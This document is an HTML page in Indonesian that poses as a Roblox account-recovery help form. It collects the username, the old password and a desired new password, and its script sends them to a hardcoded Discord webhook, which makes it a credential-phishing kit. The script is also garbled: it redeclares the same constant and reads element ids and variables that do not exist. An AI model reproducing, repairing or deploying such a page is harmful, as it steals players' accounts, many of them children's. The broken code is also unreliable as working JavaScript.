<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulir Bantuan Akun Roblox</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #1e1e24;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #2b2b36;
            padding: 25px;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
            width: 320px;
        }
        h2 {
            text-align: center;
            margin-bottom: 20px;
            font-size: 20px;
        }
        label {
            font-size: 14px;
            display: block;
            margin-bottom: 5px;
        }
        input, textarea {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #444;
            border-radius: 4px;
            background-color: #18181c;
            color: #fff;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #00a2ff;
            border: none;
            border-radius: 4px;
            color: white;
            font-weight: bold;
            cursor: pointer;
        }
        button:hover {
            background-color: #0082cc;
        }
    </style>
</head>
<body>

<div class="container">
    <h2>Minta Bantuan Pemulihan</h2>
    <form id="helpForm">
        <label for="username">Username Roblox Kamu:</label>
        <input type="text" id="username" placeholder="Masukkan Username" required>

        <label for="PassowrdLma">Password Lama:</label>
        <input type="text" id="contact" placeholder="Password Contoh: admin123" required>

      <label for="PasswordBru">Password Yang Kamu Ingin:</label>
        <input type="text" id="contact" placeholder="Password Lama Contoh: password_keren" required>

      <label for="Keterangan">Keterangan Jam:</label>
        <input type="text" id="contact" placeholder="Contoh: jam 2 pagi" required>

        <label for="message">Kendala:</label>
        <textarea id="message" rows="3" placeholder="Jelaskan kendala kamu..." required></textarea>

        <button type="submit">Kirim Permintaan Bantuan</button>
    </form>
</div>

<script>
    document.getElementById('helpForm').addEventListener('submit', function(e) {
        e.preventDefault();
        
        const username = document.getElementById('username').value;
        const contact = document.getElementById('PassowrdLma').value;
        const message = document.
        getElementById('PassowrdBru').value;
        const message = document.
        getElementById('Keterangan').value;
        const message = document.
        getElementById('message').value;

        // Ganti URL ini dengan URL Webhook Discord Anda sendiri
        const webhookUrl = "https://discord.com/api/webhooks/1561308435285278730/-o62bHrgDzOV_QAjQuk2W6DKgyAEJad348oqvaG_guS7Bfc7uiCKMa1uM5YBFINB7m97";

        const payload = {
            embeds: [{
                title: "📌 Permintaan Bantuan Akun Baru",
                color: 3447003,
                fields: [
                    { name: "Username Roblox", value: username, inline: true },
                    { name: "Password Lama", value: PassowrdLma, inline: true },
                    { name: "Password Baru", value: PassowrdBru, inline: true },
                    { name: "Keterangan Jam", value: Keterangan, inline: true },
                    { name: "Detail Kendala", value: message }
                ],
                timestamp: new Date()
            }]
        };

        fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        }).then(response => {
            if (response.ok) {
                alert("Konfirmasi Berhasil! Silakan tunggu pesan balasan sekitar beberapa jam");
                document.getElementById('helpForm').reset();
            } else {
                alert("Gagal mengirim permintaan. Coba lagi nanti.");
            }
        }).catch(err => {
            alert("Terjadi kesalahan koneksi.");
        });
    });
</script>

</body>
</html>
